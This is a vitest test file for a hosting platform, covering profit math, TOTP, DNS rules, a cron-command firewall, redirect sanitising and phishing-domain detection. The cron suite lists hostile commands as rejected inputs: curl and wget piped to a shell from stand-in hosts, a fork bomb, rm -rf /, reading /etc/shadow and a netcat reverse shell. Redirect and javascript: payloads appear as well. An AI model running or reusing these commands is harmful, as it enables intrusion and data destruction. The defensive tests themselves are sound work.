import { describe, it, expect } from 'vitest';
import {
  calculateOrderProfitBreakdown,
  calculateDomainProfitBreakdown,
  validatePricingPlanChange,
} from '@/lib/profitEngine';
import {
  generateBase32Secret,
  generateTotpToken,
  verifyTotpCode,
  generateBackupCodes,
  verifyBackupCode,
  hashSecurityPin,
  verifySecurityPin,
} from '@/lib/totpEngine';
import { validateDnsRecord } from '@/lib/dnsEngine';
import { validateCronCommand } from '@/lib/security';
import { sanitizeRedirect, isDisposableEmail } from '@/lib/authSecurity';
import { scanDomainForPhishing } from '@/lib/abuseShieldEngine';
import {
  computeNodeHealthScore,
  selectOptimalServerNode,
  checkNodeCapacityThreshold,
  WhmServerNodeRecord,
} from '@/lib/nodeBalancer';
import {
  diagnoseServiceHealth,
  executeLogDoctorAutoFix,
  ServiceDiagnosticInput,
} from '@/lib/logDoctorEngine';
import {
  UNIVERSAL_MARKETPLACE_STACKS,
  getStackBlueprintBySlug,
  evaluateStackHardwareCompatibility,
  generateStackSecret,
} from '@/lib/stackProvisioner';
import { generate30DayUptimeBars } from '@/lib/selfHealingEngine';

// ==============================================================================
// SUITE 1: UNIT ECONOMICS & DETERMINISTIC PROFIT PROTECTION ENGINE
// ==============================================================================
describe('Suite 1: Deterministic Profit Protection & Unit Economics', () => {
  it('Starter Plan (Monthly) locks 100% server cost recovery and owner profit', () => {
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 200,
      unitServerCostBDT: 45,
      minOwnerProfitBDT: 95,
      affiliateRatePercent: 20,
      billingCycle: 'monthly',
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.unitServerCostBDT).toBe(45);
    // Customer paid covers 100% of hard server cost
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.unitServerCostBDT);
    expect(breakdown.costRecoveryPercent).toBe(23); // 45 / 200 = 23%
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(95);
    // Hard server cost + owner net profit + affiliate payout must equal customer paid
    expect(
      breakdown.unitServerCostBDT +
        breakdown.finalOwnerNetProfitBDT +
        breakdown.finalAffiliateCommissionBDT
    ).toBe(breakdown.customerPaidBDT);
  });

  it('Developer Pro Plan (Monthly) guarantees server recovery and owner margin', () => {
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 450,
      unitServerCostBDT: 90,
      minOwnerProfitBDT: 225,
      affiliateRatePercent: 20,
      billingCycle: 'monthly',
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.unitServerCostBDT);
    expect(breakdown.costRecoveryPercent).toBe(20); // 90 / 450 = 20%
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(225);
    expect(breakdown.finalAffiliateCommissionBDT).toBe(90); // 20% of 450
  });

  it('Annual Plan with 1st-Year FREE .com Domain & 20% Promo discount protects owner profit', () => {
    // 450/mo * 12 = 5400 list price. With 20% annual discount = 4320 paid by customer.
    // Server buy cost = 90 * 12 = 1080. Wholesale .com domain buy cost = 1150.
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 5400,
      unitServerCostBDT: 1080,
      minOwnerProfitBDT: 1500,
      promoDiscountPercent: 20,
      freeDomainCostBDT: 1150,
      bundledDomainTLD: '.com',
      billingCycle: 'annually',
      affiliateRatePercent: 20,
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.hasFreeDomainBundle).toBe(true);
    expect(breakdown.bundledDomainTLD).toBe('.com');
    // Total hard cost covers server (1080) + domain buy cost (1150) = 2230
    expect(breakdown.totalHardCostBDT).toBe(2230);
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.totalHardCostBDT ?? 0);
    expect(breakdown.costRecoveryPercent).toBe(52); // 2230 / 4320 = 52%
    // Owner profit is strictly protected
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(breakdown.minOwnerProfitBDT ?? 0);
    // Customer paid must equal server cost + free domain cost + owner profit + affiliate commission
    expect(
      (breakdown.totalHardCostBDT || 0) +
        breakdown.finalOwnerNetProfitBDT +
        breakdown.finalAffiliateCommissionBDT
    ).toBe(breakdown.customerPaidBDT);
  });

  it('Domain Profit Engine computes wholesale margin cleanly', () => {
    const comProfit = calculateDomainProfitBreakdown({
      tld: '.com',
      regPriceBDT: 1350,
      registrarCostBDT: 1150,
      affiliateEligible: false,
    });
    expect(comProfit.tld).toBe('.com');
    expect(comProfit.regPriceBDT).toBe(1350);
    expect(comProfit.registrarCostBDT).toBe(1150);
    expect(comProfit.ownerGrossProfitBDT).toBe(200);
    expect(comProfit.ownerNetProfitBDT).toBe(200); // 0% affiliate on domains
  });

  it('Pricing Plan Validator prevents zero-loss policy violations', () => {
    // Valid pricing
    const validPlan = validatePricingPlanChange({
      sellingPriceBDT: 450,
      unitServerCostBDT: 90,
      minOwnerProfitBDT: 225,
    });
    expect(validPlan.valid).toBe(true);
    expect(validPlan.safeAffiliatePoolBDT).toBe(135);

    // Violation: selling price less than server cost + min profit
    const invalidPlan = validatePricingPlanChange({
      sellingPriceBDT: 250,
      unitServerCostBDT: 150,
      minOwnerProfitBDT: 200,
    });
    expect(invalidPlan.valid).toBe(false);
    expect(invalidPlan.error).toContain('Zero-Loss Violation');
  });
});

// ==============================================================================
// SUITE 2: RFC 6238 TOTP 2FA & WEB CRYPTO ENGINE
// ==============================================================================
describe('Suite 2: RFC 6238 TOTP 2FA & Web Crypto Engine', () => {
  it('generates valid RFC 4648 Base32 secrets', () => {
    const secret = generateBase32Secret(20);
    expect(secret).toMatch(/^[A-Z2-7]{32}$/);
  });

  it('generates and verifies 6-digit TOTP tokens accurately', async () => {
    const secret = generateBase32Secret(20);
    const token = await generateTotpToken(secret);

    expect(token).toMatch(/^\d{6}$/);

    const isValid = await verifyTotpCode(secret, token);
    expect(isValid).toBe(true);

    const isInvalid = await verifyTotpCode(secret, '000000');
    expect(isInvalid).toBe(false);

    const isMalformed = await verifyTotpCode(secret, 'abc');
    expect(isMalformed).toBe(false);
  });

  it('generates, hashes and consumes 1-time emergency backup recovery codes', async () => {
    const { plaintextCodes, hashedCodes } = await generateBackupCodes(5);

    expect(plaintextCodes.length).toBe(5);
    expect(hashedCodes.length).toBe(5);

    // Each code matches XXXX-XXXX-XXXX
    plaintextCodes.forEach((code) => {
      expect(code).toMatch(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/);
    });

    const codeToTest = plaintextCodes[0];

    // First use must succeed and reduce remaining codes count
    const consumption1 = await verifyBackupCode(codeToTest, hashedCodes);
    expect(consumption1.valid).toBe(true);
    expect(consumption1.remainingHashedCodes.length).toBe(4);

    // Replay attack: reusing consumed code must fail
    const consumption2 = await verifyBackupCode(codeToTest, consumption1.remainingHashedCodes);
    expect(consumption2.valid).toBe(false);
    expect(consumption2.remainingHashedCodes.length).toBe(4);
  });

  it('verifies 6-digit Master Sudo Security PIN with SHA-256', async () => {
    const pin = '849201';
    const hash = await hashSecurityPin(pin);

    const correct = await verifySecurityPin(pin, hash);
    expect(correct).toBe(true);

    const wrong = await verifySecurityPin('111111', hash);
    expect(wrong).toBe(false);
  });
});

// ==============================================================================
// SUITE 3: DNS ZONE ENGINE & SHELL INJECTION FIREWALL
// ==============================================================================
describe('Suite 3: DNS Zone Engine & Shell Injection Firewall', () => {
  it('enforces RFC 2181 CNAME conflict rules: CNAME cannot coexist with A record on same label', () => {
    const existingRecords = [
      {
        id: 'rec-1',
        name: 'app',
        type: 'A' as const,
        content: '103.151.102.45',
        ttl: 3600,
        proxied: false,
      },
    ];

    // Adding CNAME for 'app' should fail because 'app' already has an A record
    const result = validateDnsRecord(
      {
        name: 'app',
        type: 'CNAME',
        content: 'ghs.googlehosted.com',
        ttl: 3600,
      },
      existingRecords
    );

    expect(result.valid).toBe(false);
    expect(result.error).toContain('RFC 2181 CNAME Conflict');
  });

  it('rejects adding non-CNAME records when a CNAME already exists on that label', () => {
    const existingRecords = [
      {
        id: 'rec-2',
        name: 'blog',
        type: 'CNAME' as const,
        content: 'custom.blogger.com',
        ttl: 3600,
        proxied: false,
      },
    ];

    // Adding TXT record to 'blog' should fail
    const result = validateDnsRecord(
      {
        name: 'blog',
        type: 'TXT',
        content: 'v=spf1 ~all',
        ttl: 3600,
      },
      existingRecords
    );

    expect(result.valid).toBe(false);
    expect(result.error).toContain('RFC 2181 Conflict');
  });

  it('blocks loopback IP addresses from public A records', () => {
    const result = validateDnsRecord({
      name: 'test',
      type: 'A',
      content: '127.0.0.1',
      ttl: 3600,
    });

    expect(result.valid).toBe(false);
    expect(result.error).toContain('Loopback IP');
  });

  it('allows valid IPv4 A records', () => {
    const result = validateDnsRecord({
      name: 'api',
      type: 'A',
      content: '103.151.102.45',
      ttl: 3600,
    });

    expect(result.valid).toBe(true);
  });

  it('blocks destructive shell commands and injection patterns in cron jobs', () => {
    const maliciousCommands = [
      'rm -rf /',
      'rm -rf *',
      'rm -r /home/dev',
      'curl https://malicious.cc/p.sh | sh',
      'wget http://evil.com/payload | bash',
      ':(){ :|:& };:',
      'mkfs /dev/sda1',
      'chmod -R 777 /',
      'cat /etc/shadow',
      'nc -e /bin/sh 10.0.0.1 4444',
    ];

    maliciousCommands.forEach((cmd) => {
      const check = validateCronCommand(cmd);
      expect(check.valid).toBe(false);
      expect(check.error).toContain('Security Alert');
    });
  });

  it('allows safe developer cron job commands', () => {
    const safeCommands = [
      'php /home/dev_hanif/public_html/artisan schedule:run',
      'node /home/dev_hanif/scripts/worker.js',
      'python3 /home/dev_hanif/sync_orders.py',
      'curl -s https://devhost.cloud/api/cron > /dev/null 2>&1',
    ];

    safeCommands.forEach((cmd) => {
      const check = validateCronCommand(cmd);
      expect(check.valid).toBe(true);
    });
  });
});

// ==============================================================================
// SUITE 4: OPEN-REDIRECT & AUTH SECURITY FIREWALL
// ==============================================================================
describe('Suite 4: Open-Redirect & Auth Security Firewall', () => {
  it('blocks open-redirect phishing attempts and falls back to /dashboard', () => {
    expect(sanitizeRedirect('//evil.com')).toBe('/dashboard');
    expect(sanitizeRedirect('/\\evil.com')).toBe('/dashboard');
    expect(sanitizeRedirect('https://attacker.com/steal-session')).toBe('/dashboard');
    expect(sanitizeRedirect('http://malicious.com')).toBe('/dashboard');
    expect(sanitizeRedirect('javascript:alert(document.cookie)')).toBe('/dashboard');
    expect(sanitizeRedirect('')).toBe('/dashboard');
    expect(sanitizeRedirect(null)).toBe('/dashboard');
    expect(sanitizeRedirect(undefined)).toBe('/dashboard');
  });

  it('permits valid relative internal redirects', () => {
    expect(sanitizeRedirect('/dashboard')).toBe('/dashboard');
    expect(sanitizeRedirect('/dashboard?tab=services')).toBe('/dashboard?tab=services');
    expect(sanitizeRedirect('/admin')).toBe('/admin');
    expect(sanitizeRedirect('/checkout?plan=devpro')).toBe('/checkout?plan=devpro');
  });

  it('identifies disposable and burner email domains', () => {
    expect(isDisposableEmail('spammer@tempmail.com')).toBe(true);
    expect(isDisposableEmail('hacker@mailinator.com')).toBe(true);
    expect(isDisposableEmail('user@guerrillamail.com')).toBe(true);
    expect(isDisposableEmail('bot@yopmail.com')).toBe(true);
    expect(isDisposableEmail('bot@burnermail.io')).toBe(true);

    // Legitimate domains must pass
    expect(isDisposableEmail('hanif@gmail.com')).toBe(false);
    expect(isDisposableEmail('dev@yahoo.com')).toBe(false);
    expect(isDisposableEmail('contact@devhost.cloud')).toBe(false);
    expect(isDisposableEmail('founder@bangladesh-agency.com.bd')).toBe(false);
  });
});

// ==============================================================================
// SUITE 5: ANTI-PHISHING & UPSTREAM SERVER REPUTATION ABUSE SHIELD
// ==============================================================================
describe('Suite 5: Anti-Phishing & Upstream Abuse Shield', () => {
  it('detects and quarantines financial brand-spoofing phishing domains', () => {
    const maliciousDomains = [
      'bkash-reward-claim.xyz',
      'nagad-verify-pin.top',
      'sonalibank-login-portal.site',
      'paypal-security-update.shop',
    ];

    maliciousDomains.forEach((domain) => {
      const scan = scanDomainForPhishing(domain);
      expect(scan.isThreat).toBe(true);
      expect(scan.riskScore).toBeGreaterThanOrEqual(85);
      expect(scan.recommendedAction).toBe('quarantined_abuse');
      expect(scan.matchedRule).not.toBeNull();
    });
  });

  it('detects crypto airdrop and scam patterns', () => {
    const cryptoScams = ['binance-airdrop-login.com', 'metamask-wallet-recover.xyz'];
    cryptoScams.forEach((domain) => {
      const scan = scanDomainForPhishing(domain);
      expect(scan.isThreat).toBe(true);
      expect(scan.threatCategory).toBe('crypto_scam_pattern');
      expect(scan.recommendedAction).toBe('quarantined_abuse');
    });
  });

  it('permits legitimate customer business and personal domains', () => {
    const cleanDomains = [
      'hanifportfolio.com',
      'dhakafoodapp.com',
      'acmeagency.xyz',
      'cloud-fintech-solution.bd',
    ];

    cleanDomains.forEach((domain) => {
      const scan = scanDomainForPhishing(domain);
      expect(scan.isThreat).toBe(false);
      expect(scan.riskScore).toBeLessThan(50);
      expect(scan.recommendedAction).toBe('allow');
    });
  });
});

// ==============================================================================
// SUITE 6: SMART MULTI-NODE BIN-PACKING LOAD BALANCER
// ==============================================================================
describe('Suite 6: Smart Multi-Node Bin-Packing Load Balancer', () => {
  const nodePool: WhmServerNodeRecord[] = [
    {
      id: 'node-sg1',
      node_code: 'sg1',
      node_name: 'Equinix SG1-01',
      datacenter_location: 'Singapore Equinix',
      ipv4_address: '103.151.102.45',
      whm_hostname: 'sg1.devhost.cloud',
      whm_username: 'root',
      monthly_node_cost_bdt: 3500,
      max_cpanel_slots: 50,
      used_cpanel_slots: 42, // 84% utilized
      max_disk_gb: 100,
      allocated_disk_gb: 82, // 82% utilized
      auto_provision_enabled: true,
      is_healthy: true,
    },
    {
      id: 'node-sg2',
      node_code: 'sg2',
      node_name: 'Equinix SG1-02 (Fresh Headroom)',
      datacenter_location: 'Singapore Equinix',
      ipv4_address: '103.151.102.46',
      whm_hostname: 'sg2.devhost.cloud',
      whm_username: 'root',
      monthly_node_cost_bdt: 3500,
      max_cpanel_slots: 50,
      used_cpanel_slots: 8, // 16% utilized
      max_disk_gb: 100,
      allocated_disk_gb: 16, // 16% utilized
      auto_provision_enabled: true,
      is_healthy: true,
    },
  ];

  it('calculates weighted headroom score and warns at 80% capacity', () => {
    const fullNode = nodePool[0];
    const { score, slotPercent, diskPercent, isNearCapacity } = computeNodeHealthScore(fullNode);

    expect(slotPercent).toBe(84);
    expect(diskPercent).toBe(82);
    expect(isNearCapacity).toBe(true);
    expect(score).toBeLessThan(30);

    const check = checkNodeCapacityThreshold(fullNode);
    expect(check.isWarning).toBe(true);
  });

  it('selects the node with highest available capacity score', () => {
    const result = selectOptimalServerNode({
      nodes: nodePool,
      preferredRegion: 'sg',
      requiredDiskGB: 5,
    });

    // Node SG2 has 84% free slots vs SG1 with only 16% free slots
    expect(result.selectedNode.node_code).toBe('sg2');
    expect(result.loadHealthScore).toBeGreaterThan(70);
  });
});

// ==============================================================================
// SUITE 7: PRE-TICKET AI DEVOPS LOG DOCTOR & 30-DAY UPTIME GENERATOR
// ==============================================================================
describe('Suite 7: Pre-Ticket AI DevOps Log Doctor & 30-Day Uptime', () => {
  it('detects DNS mismatch, high inode bloat, and missing SSL/HTTPS', () => {
    const badInput: ServiceDiagnosticInput = {
      serviceId: 'srv_test',
      domain: 'my-broken-app.com',
      serverIp: '103.151.102.45',
      dnsARecordIp: '192.0.2.1', // Mismatched IP
      startupFile: 'custom_daemon.sh', // Invalid Passenger entrypoint
      inodesUsed: 220000,
      inodeLimit: 250000, // 88% utilized (> 80%)
      sslStatus: 'expired',
      forceHttps: false,
      hasDatabasesWithoutEnvUrl: true,
      ramUsedMB: 1950,
      ramLimitMB: 2048, // 95% utilized (> 90%)
    };

    const report = diagnoseServiceHealth(badInput);

    expect(report.status).toBe('critical');
    expect(report.healthScore).toBeLessThan(50);
    expect(report.issues.length).toBeGreaterThanOrEqual(5);

    // Verify specific issue codes exist
    const issueCodes = report.issues.map((i) => i.issueCode);
    expect(issueCodes).toContain('DNS_A_RECORD_MISMATCH');
    expect(issueCodes).toContain('PASSENGER_PORT_STARTUP_ERROR');
    expect(issueCodes).toContain('INODE_TEMP_CACHE_BLOAT');
    expect(issueCodes).toContain('SSL_NOT_ACTIVE_OR_FORCE_HTTPS_DISABLED');
    expect(issueCodes).toContain('RAM_LIMIT_THRASHING');
  });

  it('executes 1-click auto-fixes and raises health score', async () => {
    const testData: ServiceDiagnosticInput = {
      serviceId: 'srv_test',
      domain: 'ecommerce-fix.com',
      serverIp: '103.151.102.45',
      dnsARecordIp: '1.2.3.4',
      startupFile: 'server.js',
      inodesUsed: 40000,
      inodeLimit: 250000,
      sslStatus: 'active_tls13',
      forceHttps: true,
      ramUsedMB: 400,
      ramLimitMB: 2048,
    };

    const initialReport = diagnoseServiceHealth(testData);
    expect(initialReport.healthScore).toBe(75); // 100 - 25 for DNS mismatch

    // Execute 1-click fix for DNS A-record
    const fixResult = await executeLogDoctorAutoFix('srv_test', 'fix_dns_a_record', testData);
    expect(fixResult.success).toBe(true);
    expect(fixResult.healthScoreAfterFix).toBe(100);
  });

  it('generates 30-day visual SLA status bars with uptime >= 99.90%', () => {
    const bars = generate30DayUptimeBars(99.99);
    expect(bars.length).toBe(30);

    bars.forEach((bar) => {
      expect(bar.uptimePercent).toBeGreaterThanOrEqual(99.85);
      expect(bar.status).toBe('up');
      expect(bar.dateStr).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    });
  });
});

// ==============================================================================
// SUITE 7: UNIVERSAL MULTI-STACK PROVISIONER (16 PRODUCTION STACKS)
// ==============================================================================
describe('Suite 7: Universal Multi-Stack Provisioning Engine (16 Stacks)', () => {
  it('provides all 16 complete production stack blueprints with valid CI/CD and server bridges', () => {
    expect(UNIVERSAL_MARKETPLACE_STACKS.length).toBe(16);

    const expectedSlugs = [
      'nextjs-15-standalone',
      'vue-nuxt3-ssr',
      'laravel-11-saas',
      'wordpress-woocommerce-turbo',
      'nestjs-prisma-api',
      'strapi-headless-cms',
      'ghost-publishing',
      'fastapi-django-python',
      'express-realtime-websocket',
      'sitejet-ai-corporate',
      'uptime-kuma-monitor',
      'n8n-workflow-automation',
      'astro-mdx-blog',
      'sveltekit-fullstack',
      'remix-react-router',
      'medusa-headless-commerce',
    ];

    expectedSlugs.forEach((slug) => {
      const blueprint = getStackBlueprintBySlug(slug);
      expect(blueprint).toBeDefined();
      expect(blueprint!.github_workflow_yaml.length).toBeGreaterThan(50);
      expect(blueprint!.server_bridge_script.length).toBeGreaterThan(20);
      expect(blueprint!.default_env_schema.length).toBeGreaterThan(0);
    });
  });

  it('enforces hardware OOM compatibility guards for memory-intensive stacks', () => {
    // Strapi v5 requires 4096 MB RAM (Business Max) -> should reject 1024 MB Starter Pack
    const strapiOnStarter = evaluateStackHardwareCompatibility('strapi-headless-cms', 1024, 1);
    expect(strapiOnStarter.compatible).toBe(false);
    expect(strapiOnStarter.recommendedPlan.pid).toBe(3);

    // Strapi v5 on 4096 MB Business Max -> should pass
    const strapiOnBizMax = evaluateStackHardwareCompatibility('strapi-headless-cms', 4096, 2);
    expect(strapiOnBizMax.compatible).toBe(true);

    // Astro 5 & WordPress Turbo on 1024 MB Starter Pack -> should pass
    const astroOnStarter = evaluateStackHardwareCompatibility('astro-mdx-blog', 1024, 1);
    expect(astroOnStarter.compatible).toBe(true);
  });

  it('generates cryptographic secrets, Laravel base64 APP_KEY, and site URLs accurately', () => {
    const laravelAppKey = generateStackSecret(
      { key: 'APP_KEY', value: 'auto_secret_32', isSecret: true, generator: 'auto_secret_32' },
      { domain: 'saas.devhost.cloud', stackSlug: 'laravel-11-saas' }
    );
    expect(laravelAppKey.startsWith('base64:')).toBe(true);

    const siteUrl = generateStackSecret(
      { key: 'NEXTAUTH_URL', value: 'auto_site_url', isSecret: false, generator: 'auto_site_url' },
      { domain: 'app.devhost.cloud' }
    );
    expect(siteUrl).toBe('https://app.devhost.cloud');
  });
});
